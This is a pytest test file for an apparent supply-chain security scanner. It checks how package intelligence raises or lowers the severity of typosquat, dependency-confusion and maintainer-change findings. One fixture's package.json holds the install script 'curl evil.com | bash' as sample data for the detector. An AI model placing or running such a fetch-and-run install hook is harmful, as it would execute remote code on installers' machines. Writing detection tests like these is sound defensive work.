from __future__ import annotations

import json
from pathlib import Path

import pytest

from picosentry.scan.engine import ScanEngine
from picosentry.scan.models import Confidence, Finding, ScanResult, Severity
from picosentry.scan.package_intel import PackageIntel, PackageIntelligence


@pytest.fixture
def sample_npm_project(tmp_path):
    pkg = tmp_path / "package.json"
    pkg.write_text(
        json.dumps(
            {
                "name": "test-pkg",
                "version": "1.0.0",
                "maintainers": [{"name": "alice", "email": "alice@example.com"}],
                "scripts": {"postinstall": "echo hi"},
                "dependencies": {"express": "^4.0.0"},
            }
        )
    )
    node_modules = tmp_path / "node_modules"
    node_modules.mkdir()
    nm_pkg = node_modules / "express" / "package.json"
    nm_pkg.parent.mkdir(parents=True, exist_ok=True)
    nm_pkg.write_text(
        json.dumps(
            {
                "name": "express",
                "version": "4.18.2",
                "maintainers": [{"name": "doug", "email": "doug@example.com"}],
            }
        )
    )
    return tmp_path


@pytest.fixture
def sample_npm_project_anonymous(tmp_path):
    pkg = tmp_path / "package.json"
    pkg.write_text(
        json.dumps(
            {
                "name": "anon-pkg",
                "version": "1.0.0",
                "maintainers": [{"name": "", "email": ""}],
                "scripts": {"install": "curl evil.com | bash"},
            }
        )
    )
    return tmp_path


class TestScanResultPackageIntel:
    def test_package_intel_field_defaults_empty(self):
        result = ScanResult()
        assert result.package_intel == {}

    def test_package_intel_populated_in_scan(self, sample_npm_project):
        engine = ScanEngine(corpus_dir=Path(__file__).parent.parent / "scan" / "corpus")
        engine.register("L2-MAINT-001", lambda target: [])
        result = engine.scan(sample_npm_project, rules=["L2-MAINT-001"])
        assert isinstance(result.package_intel, dict)
        assert "test-pkg" in result.package_intel
        assert isinstance(result.package_intel["test-pkg"], PackageIntel)

    def test_package_intel_in_to_dict(self, sample_npm_project):
        engine = ScanEngine(corpus_dir=Path(__file__).parent.parent / "scan" / "corpus")
        engine.register("L2-MAINT-001", lambda target: [])
        result = engine.scan(sample_npm_project, rules=["L2-MAINT-001"])
        d = result.to_dict()
        assert "package_intel" in d
        assert "test-pkg" in d["package_intel"]
        assert d["package_intel"]["test-pkg"]["maintainer_count"] == 1

    def test_package_intel_not_in_deterministic_output(self, sample_npm_project):
        engine = ScanEngine(corpus_dir=Path(__file__).parent.parent / "scan" / "corpus")
        engine.register("L2-MAINT-001", lambda target: [])
        result = engine.scan(sample_npm_project, rules=["L2-MAINT-001"])
        d = result.to_dict(deterministic_output=True)
        assert "package_intel" not in d


class TestMaintainerChangeWithIntel:
    def test_uses_package_intel_when_available(self, sample_npm_project):
        from picosentry.scan.rules.maintainer_change import detect_maintainer_changes

        intel = PackageIntelligence().analyze(
            {"name": "test-pkg", "version": "1.0.0", "maintainers": [], "scripts": {"postinstall": "echo hi"}},
            ecosystem="npm",
        )
        package_intel = {"test-pkg": intel}

        findings = detect_maintainer_changes(sample_npm_project, package_intel=package_intel)
        assert any(f.rule_id == "L2-MAINT-001" for f in findings)

    def test_falls_back_without_intel(self, sample_npm_project):
        from picosentry.scan.rules.maintainer_change import detect_maintainer_changes

        findings = detect_maintainer_changes(sample_npm_project, package_intel=None)
        assert isinstance(findings, list)

    def test_empty_intel_dict_falls_back(self, sample_npm_project):
        from picosentry.scan.rules.maintainer_change import detect_maintainer_changes

        findings = detect_maintainer_changes(sample_npm_project, package_intel={})
        assert isinstance(findings, list)


class TestTyposquatWithIntel:
    def test_anonymous_maintainer_escalates_severity(self, sample_npm_project_anonymous):
        from picosentry.scan.rules.typosquat import _enforce_evidence

        intel = PackageIntel(maintainer_count=0, anonymous_maintainer=True, risk_score=0.3)
        finding = Finding(
            rule_id="L2-TYPO-001",
            severity=Severity.HIGH,
            confidence=Confidence.MEDIUM,
            package="anon-pkg",
            file="package.json",
            message="test",
            evidence="edit_distance = 1",
            remediation="check",
            references=[],
        )
        result = _enforce_evidence(finding, "anon-pkg", {"anon-pkg": intel})
        assert result.severity == Severity.CRITICAL

    def test_high_risk_boosts_confidence(self):
        from picosentry.scan.rules.typosquat import _enforce_evidence

        intel = PackageIntel(risk_score=0.7, maintainer_count=1, has_repository_url=True)
        finding = Finding(
            rule_id="L2-TYPO-001",
            severity=Severity.HIGH,
            confidence=Confidence.MEDIUM,
            package="test-pkg",
            file="package.json",
            message="test",
            evidence="edit_distance = 1",
            remediation="check",
            references=[],
        )
        result = _enforce_evidence(finding, "test-pkg", {"test-pkg": intel})
        assert result.confidence == Confidence.HIGH

    def test_well_maintained_suppresses(self):
        from picosentry.scan.rules.typosquat import _enforce_evidence

        intel = PackageIntel(maintainer_count=6, has_repository_url=True, risk_score=0.1, has_install_scripts=False)
        finding = Finding(
            rule_id="L2-TYPO-001",
            severity=Severity.HIGH,
            confidence=Confidence.MEDIUM,
            package="test-pkg",
            file="package.json",
            message="test",
            evidence="edit_distance = 1",
            remediation="check",
            references=[],
        )
        result = _enforce_evidence(finding, "test-pkg", {"test-pkg": intel})
        assert result.severity == Severity.MEDIUM

    def test_none_intel_returns_unchanged(self):
        from picosentry.scan.rules.typosquat import _enforce_evidence

        finding = Finding(
            rule_id="L2-TYPO-001",
            severity=Severity.HIGH,
            confidence=Confidence.MEDIUM,
            package="test-pkg",
            file="package.json",
            message="test",
            evidence="edit_distance = 1",
            remediation="check",
            references=[],
        )
        result = _enforce_evidence(finding, "test-pkg", None)
        assert result.severity == Severity.HIGH

    def test_missing_package_returns_unchanged(self):
        from picosentry.scan.rules.typosquat import _enforce_evidence

        intel = PackageIntel(maintainer_count=0, anonymous_maintainer=True)
        finding = Finding(
            rule_id="L2-TYPO-001",
            severity=Severity.HIGH,
            confidence=Confidence.MEDIUM,
            package="test-pkg",
            file="package.json",
            message="test",
            evidence="edit_distance = 1",
            remediation="check",
            references=[],
        )
        result = _enforce_evidence(finding, "test-pkg", {"other-pkg": intel})
        assert result.severity == Severity.HIGH

    def test_typo_evidence_includes_anonymous_maintainer(self):
        from picosentry.scan.rules.typosquat import _enforce_evidence

        intel = PackageIntel(anonymous_maintainer=True, maintainer_count=0, risk_score=0.3)
        finding = Finding(
            rule_id="L2-TYPO-001",
            severity=Severity.HIGH,
            confidence=Confidence.MEDIUM,
            package="suspicious-pkg",
            file="package.json",
            message="test",
            evidence="edit_distance(suspicious-pkg, express) = 1",
            remediation="check",
            references=[],
        )
        result = _enforce_evidence(finding, "suspicious-pkg", {"suspicious-pkg": intel})
        assert "; anonymous maintainer" in result.evidence

    def test_typo_evidence_includes_risk_score(self):
        from picosentry.scan.rules.typosquat import _enforce_evidence

        intel = PackageIntel(risk_score=0.72, maintainer_count=1, has_repository_url=True)
        finding = Finding(
            rule_id="L2-TYPO-001",
            severity=Severity.HIGH,
            confidence=Confidence.MEDIUM,
            package="suspicious-pkg",
            file="package.json",
            message="test",
            evidence="edit_distance(suspicious-pkg, express) = 1",
            remediation="check",
            references=[],
        )
        result = _enforce_evidence(finding, "suspicious-pkg", {"suspicious-pkg": intel})
        assert "risk score 0.72" in result.evidence

    def test_typo_evidence_includes_no_repository_url(self):
        from picosentry.scan.rules.typosquat import _enforce_evidence

        intel = PackageIntel(has_repository_url=False, maintainer_count=1, risk_score=0.1)
        finding = Finding(
            rule_id="L2-TYPO-001",
            severity=Severity.HIGH,
            confidence=Confidence.MEDIUM,
            package="suspicious-pkg",
            file="package.json",
            message="test",
            evidence="edit_distance = 1",
            remediation="check",
            references=[],
        )
        result = _enforce_evidence(finding, "suspicious-pkg", {"suspicious-pkg": intel})
        assert "no repository URL" in result.evidence

    def test_typo_evidence_includes_install_scripts(self):
        from picosentry.scan.rules.typosquat import _enforce_evidence

        intel = PackageIntel(has_install_scripts=True, maintainer_count=1, risk_score=0.1, has_repository_url=True)
        finding = Finding(
            rule_id="L2-TYPO-001",
            severity=Severity.HIGH,
            confidence=Confidence.MEDIUM,
            package="suspicious-pkg",
            file="package.json",
            message="test",
            evidence="edit_distance = 1",
            remediation="check",
            references=[],
        )
        result = _enforce_evidence(finding, "suspicious-pkg", {"suspicious-pkg": intel})
        assert "has install scripts" in result.evidence


class TestDepConfusionWithIntel:
    def test_install_scripts_adds_evidence(self):
        from picosentry.scan.rules.dep_confusion import _apply_depc_intel

        intel = PackageIntel(has_install_scripts=True, has_postinstall_script=True)
        finding = Finding(
            rule_id="L2-DEPC-001",
            severity=Severity.CRITICAL,
            confidence=Confidence.HIGH,
            package="@internal/foo",
            file="package.json",
            message="test",
            evidence="dependency: @internal/foo",
            remediation="check",
            references=[],
        )
        result = _apply_depc_intel(finding, "@internal/foo", {"@internal/foo": intel})
        assert "install scripts present" in result.evidence

    def test_no_integrity_adds_evidence(self):
        from picosentry.scan.rules.dep_confusion import _apply_depc_intel

        intel = PackageIntel(has_integrity_hash=False)
        finding = Finding(
            rule_id="L2-DEPC-001",
            severity=Severity.CRITICAL,
            confidence=Confidence.HIGH,
            package="@internal/foo",
            file="package.json",
            message="test",
            evidence="dependency: @internal/foo",
            remediation="check",
            references=[],
        )
        result = _apply_depc_intel(finding, "@internal/foo", {"@internal/foo": intel})
        assert "no integrity hash" in result.evidence

    def test_no_repo_boosts_confidence(self):
        from picosentry.scan.rules.dep_confusion import _apply_depc_intel

        intel = PackageIntel(has_repository_url=False, has_integrity_hash=True, risk_score=0.3)
        finding = Finding(
            rule_id="L2-DEPC-001",
            severity=Severity.CRITICAL,
            confidence=Confidence.MEDIUM,
            package="@internal/foo",
            file="package.json",
            message="test",
            evidence="dependency: @internal/foo",
            remediation="check",
            references=[],
        )
        result = _apply_depc_intel(finding, "@internal/foo", {"@internal/foo": intel})
        assert result.confidence == Confidence.HIGH

    def test_low_risk_lowers_confidence(self):
        from picosentry.scan.rules.dep_confusion import _apply_depc_intel

        intel = PackageIntel(risk_score=0.05, has_repository_url=True, has_integrity_hash=True)
        finding = Finding(
            rule_id="L2-DEPC-001",
            severity=Severity.CRITICAL,
            confidence=Confidence.HIGH,
            package="@internal/foo",
            file="package.json",
            message="test",
            evidence="dependency: @internal/foo",
            remediation="check",
            references=[],
        )
        result = _apply_depc_intel(finding, "@internal/foo", {"@internal/foo": intel})
        assert result.confidence == Confidence.MEDIUM

    def test_none_intel_returns_unchanged(self):
        from picosentry.scan.rules.dep_confusion import _apply_depc_intel

        finding = Finding(
            rule_id="L2-DEPC-001",
            severity=Severity.CRITICAL,
            confidence=Confidence.HIGH,
            package="@internal/foo",
            file="package.json",
            message="test",
            evidence="dependency: @internal/foo",
            remediation="check",
            references=[],
        )
        result = _apply_depc_intel(finding, "@internal/foo", None)
        assert result.confidence == Confidence.HIGH

    def test_depc_evidence_includes_install_scripts(self):
        from picosentry.scan.rules.dep_confusion import _apply_depc_intel

        intel = PackageIntel(has_install_scripts=True, has_integrity_hash=True, has_repository_url=True, risk_score=0.0)
        finding = Finding(
            rule_id="L2-DEPC-001",
            severity=Severity.CRITICAL,
            confidence=Confidence.HIGH,
            package="@internal/foo",
            file="package.json",
            message="test",
            evidence="dependency: @internal/foo",
            remediation="check",
            references=[],
        )
        result = _apply_depc_intel(finding, "@internal/foo", {"@internal/foo": intel})
        assert "install scripts present" in result.evidence

    def test_depc_evidence_includes_no_integrity_hash(self):
        from picosentry.scan.rules.dep_confusion import _apply_depc_intel

        intel = PackageIntel(
            has_integrity_hash=False, has_install_scripts=False, has_repository_url=True, risk_score=0.0
        )
        finding = Finding(
            rule_id="L2-DEPC-001",
            severity=Severity.CRITICAL,
            confidence=Confidence.HIGH,
            package="@internal/foo",
            file="package.json",
            message="test",
            evidence="dependency: @internal/foo",
            remediation="check",
            references=[],
        )
        result = _apply_depc_intel(finding, "@internal/foo", {"@internal/foo": intel})
        assert "no integrity hash" in result.evidence

    def test_depc_evidence_includes_no_repository_url(self):
        from picosentry.scan.rules.dep_confusion import _apply_depc_intel

        intel = PackageIntel(
            has_repository_url=False, has_integrity_hash=True, has_install_scripts=False, risk_score=0.0
        )
        finding = Finding(
            rule_id="L2-DEPC-001",
            severity=Severity.CRITICAL,
            confidence=Confidence.HIGH,
            package="@internal/foo",
            file="package.json",
            message="test",
            evidence="dependency: @internal/foo",
            remediation="check",
            references=[],
        )
        result = _apply_depc_intel(finding, "@internal/foo", {"@internal/foo": intel})
        assert "no repository URL" in result.evidence

    def test_depc_evidence_includes_risk_score(self):
        from picosentry.scan.rules.dep_confusion import _apply_depc_intel

        intel = PackageIntel(
            risk_score=0.35, has_integrity_hash=True, has_install_scripts=False, has_repository_url=True
        )
        finding = Finding(
            rule_id="L2-DEPC-001",
            severity=Severity.CRITICAL,
            confidence=Confidence.HIGH,
            package="@internal/foo",
            file="package.json",
            message="test",
            evidence="dependency: @internal/foo",
            remediation="check",
            references=[],
        )
        result = _apply_depc_intel(finding, "@internal/foo", {"@internal/foo": intel})
        assert "risk_score=0.35" in result.evidence


class TestMaintainerEvidenceEnrichment:
    def test_maintainer_evidence_includes_maintainer_count(self):
        from picosentry.scan.rules.maintainer_change import _enforce_maintainer_evidence

        intel = PackageIntel(maintainer_count=2, maintainer_email_domains=("example.com",), risk_score=0.3)
        result = _enforce_maintainer_evidence("_npmUser.name=evil, author=good", intel)
        assert "maintainer_count=2" in result

    def test_maintainer_evidence_includes_domains(self):
        from picosentry.scan.rules.maintainer_change import _enforce_maintainer_evidence

        intel = PackageIntel(maintainer_count=2, maintainer_email_domains=("corp.io", "evil.biz"), risk_score=0.0)
        result = _enforce_maintainer_evidence("_npmUser.name=evil, author=good", intel)
        assert "domains=corp.io, evil.biz" in result

    def test_maintainer_evidence_includes_no_repository_url(self):
        from picosentry.scan.rules.maintainer_change import _enforce_maintainer_evidence

        intel = PackageIntel(maintainer_count=1, has_repository_url=False, risk_score=0.0)
        result = _enforce_maintainer_evidence("single maintainer: alice, has install scripts", intel)
        assert "no repository URL" in result

    def test_maintainer_evidence_includes_risk_score(self):
        from picosentry.scan.rules.maintainer_change import _enforce_maintainer_evidence

        intel = PackageIntel(maintainer_count=0, risk_score=0.45)
        result = _enforce_maintainer_evidence("author field missing, maintainers field missing", intel)
        assert "risk_score=0.45" in result


class TestInvokeRuleWithPackageIntel:
    def test_rule_with_package_intel_param_receives_it(self, sample_npm_project):
        received_intel = {}

        def rule_with_intel(target: Path, package_intel: dict[str, PackageIntel] | None = None) -> list[Finding]:
            received_intel.update(package_intel or {})
            return []

        engine = ScanEngine(corpus_dir=Path(__file__).parent.parent / "scan" / "corpus")
        engine.register("L2-TEST-001", rule_with_intel)
        result = engine.scan(sample_npm_project, rules=["L2-TEST-001"])
        assert "test-pkg" in result.package_intel
        assert "test-pkg" in received_intel

    def test_rule_without_package_intel_param_still_works(self, sample_npm_project):
        def simple_rule(target: Path) -> list[Finding]:
            return []

        engine = ScanEngine(corpus_dir=Path(__file__).parent.parent / "scan" / "corpus")
        engine.register("L2-TEST-002", simple_rule)
        result = engine.scan(sample_npm_project, rules=["L2-TEST-002"])
        assert isinstance(result.findings, list)

    def test_rule_with_two_params_and_intel(self, sample_npm_project):
        received_intel = {}

        def rule_with_corpus_and_intel(
            target: Path, corpus_dir: Path, package_intel: dict[str, PackageIntel] | None = None
        ) -> list[Finding]:
            if package_intel:
                received_intel.update(package_intel)
            return []

        engine = ScanEngine(corpus_dir=Path(__file__).parent.parent / "scan" / "corpus")
        engine.register("L2-TEST-003", rule_with_corpus_and_intel)
        engine.scan(sample_npm_project, rules=["L2-TEST-003"])
        assert "test-pkg" in received_intel
